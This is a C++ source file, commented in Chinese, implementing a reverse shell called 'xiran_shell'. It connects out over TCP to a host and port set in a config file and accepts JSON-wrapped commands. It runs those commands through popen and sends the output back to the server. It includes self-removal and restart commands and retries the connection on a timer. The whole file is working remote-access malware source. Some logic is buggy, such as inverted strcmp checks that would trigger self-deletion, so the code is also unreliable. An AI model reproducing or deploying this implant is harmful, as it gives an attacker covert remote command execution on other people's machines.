/*
反弹shell实现
*/

#include <stdio.h>
#include <string.h>
#include <time.h>
#include <boost/asio.hpp>
#include <vector>
#include <iostream>
#include "config.hpp"
#include "include/rapidjson/document.h"
#include "include/rapidjson/writer.h"
#include "include/rapidjson/stringbuffer.h"
#include "misc.hpp"

using boost::asio::ip::tcp;

char host[100];
char port[100];
char protocol[100];
int retry_time = -1;

//执行shell命令
std::string execCommand(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (!feof(pipe.get())) {
        if (fgets(buffer.data(), 128, pipe.get()) != nullptr)
            result += buffer.data();
    }
    return result;
}

/*
此处解析特有命令，包括如下

自删除 removeitself
重启   restart


*/
void parser_xirancmd(char* xirancmd)
{
    if(strcmp(xirancmd,"removeitself")){
        misc::remove_itself();
    }

    if(strcmp(xirancmd,"restart")){
        misc::restart_itself();
    }

}

/*
调用命令解析器，并将结果发回服务器
*/
tcp::socket TCP_start_parser_msg(tcp::socket socket,std::unique_ptr<char[]> data)
{
    try{
            //使用json解析命令
        rapidjson::Document d_shell;
        d_shell.Parse(data.get());
        if(d_shell.GetType()!=3) throw "msg parse error";

        rapidjson::Value& data_type = d_shell["type"];
        if(data_type.GetType()!=5) throw "msg parse error";

        if(strcmp(data_type.GetString(),"cmd")==0){  //执行cmd命令
            rapidjson::Value& cmddata = d_shell["cmddata"];
            if(cmddata.GetType()!=5) throw "msg parse error";
            auto res = execCommand(cmddata.GetString());

            if(res=="") res = "no output!";

            boost::asio::write(socket, boost::asio::buffer(res));
            
        }else if(strcmp(data_type.GetString(),"change_config")==0){//修改配置文件
            const char msg[] = "Function not yet implemented"; 
            boost::asio::write(socket, boost::asio::buffer(msg, strlen(msg)));
        }else if(strcmp(data_type.GetString(),"xirancmd")==0){//执行特有命令
            
            
        }else{
            const char msg[] = "type error"; 
            boost::asio::write(socket, boost::asio::buffer(msg, strlen(msg)));
        }
        return socket;
    }catch(std::string e){
        if(e=="msg parse error"){
            const char msg[] = "msg parse error"; 
            boost::asio::write(socket, boost::asio::buffer(msg, strlen(msg)));
        }else{
            boost::asio::write(socket, boost::asio::buffer(e, e.length()));
        }
    }
    
}

/*
使用TCP进行连接，明文传输数据
*/
void start_TCP()
{
    #ifdef DEBUG
        printf("[start_TCP] run\n");
    #endif
    while(true){
        
        try {
            boost::asio::io_context io_context;

            tcp::resolver resolver(io_context);
            tcp::resolver::results_type endpoints = resolver.resolve(host, port);

            tcp::socket socket(io_context);
            boost::asio::connect(socket, endpoints);

            //发送固定字符串，协议名称，与版本号
            char version[] = "xiran_shell TCP v.1.0";
            boost::asio::write(socket, boost::asio::buffer(version, strlen(version)));

            while (true) {
                #ifdef DEBUG
                    printf("[start_TCP] start recev msg\n");
                #endif

                /*
                    接受服务器信息，并交给解析器解析
                */

                //获得数据的长度
                int data_len = 0;
                int reply_length = 0;
                reply_length = boost::asio::read(socket, boost::asio::buffer(&data_len, sizeof(int)));
                

                #ifdef DEBUG
                    printf("[start_TCP] reply_length : %d\n",reply_length);
                #endif

                //测试使用
                assert(reply_length==sizeof(int));

                std::unique_ptr<char[]> data(new char[data_len+1]);
                reply_length = boost::asio::read(socket, boost::asio::buffer(data.get(), data_len));

                //测试使用
                assert(reply_length==data_len);

                data[data_len]='\0';

                #ifdef DEBUG
                    printf("[start_TCP] reply : %s\n",data.get());
                #endif

                socket=TCP_start_parser_msg(std::move(socket),std::move(data));
            }
        }
        catch (std::exception& e) {
            std::cerr << e.what() << "\n";
        }

        //不进行重新连接
        if(retry_time==-1)
            break;
        std::this_thread::sleep_for(std::chrono::seconds(retry_time));
    }
}

void init_config()
{
    //查看配置文件中是否启用了反弹shell功能
    if( !get_enable_shell() )
        return;

    //获得连接地址
    const char* server_host = get_shell_host();
    if(strlen(server_host)>=100) return;
    strcpy(host,server_host);

    //获得连接端口
    const char* server_port = get_shell_port();
    if(strlen(server_port)>=100) return;
    strcpy(port,server_port);

    //获得使用协议
    const char* connection_protocol = get_shell_protocol();
    if(strlen(connection_protocol)>=100) return;
    strcpy(protocol,connection_protocol);

    //获得重试连接时间
    retry_time = get_retry_time();
}

void shell_start(std::vector<std::thread> &th_vec)
{
    #ifdef DEBUG
        printf("[shell_start] run\n");
    #endif
    init_config();
    if(strcmp(protocol,"TCP")==0){
        auto th = std::thread(start_TCP);
        th_vec.push_back(std::move(th));
    }else{
        //未实现的协议
        return;
    }
}


/*
测试使用
*/
// int main()
// {
//     start();
//     return 0;
// }